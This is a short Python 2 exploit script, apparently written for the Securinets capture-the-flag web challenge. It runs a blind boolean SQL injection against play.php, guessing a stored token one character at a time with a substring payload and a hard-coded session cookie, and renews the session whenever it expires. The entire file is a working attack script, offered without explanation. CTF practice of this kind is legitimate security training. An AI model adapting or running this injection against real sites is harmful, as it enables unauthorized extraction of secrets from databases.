#!/usr/bin/python
#-*- coding: utf-8 -*-

# author: bytevsbyte

import requests
import time
import string

alph = "abcdefghijklmnopqrstuvwxyz0123456789"
val  = "' OR (ip='91.121.147.194' AND substring(token,1,%d)='%s') -- "
cookies   = {'PHPSESSID':'vo2o4r8tv97in7dcahp606ee10'}
url_play  = "https://web4.ctfsecurinets.com/play.php"
url_renew = "https://web4.ctfsecurinets.com/index.php"
res = ""
for i in range(101):
    i = 0
    print '[+] ' + res
    while i < len(alph):
        c = alph[i]
        valinj = val % (len(res)+1, res+c)
        r = requests.post(url_play, cookies=cookies, data={'val': valinj})
        #print r.text
        if 'Session Expired !' in r.text or 'Max Attempts Reahed' in r.text:
            r = requests.get(url_renew, cookies=cookies)
            r = requests.get(url_play, cookies=cookies)
            #print '[+] EXPIRED'
        elif not 'Better luck next time !' in r.text:
            res += c
            break
        else:
            i += 1
        time.sleep(0.1)
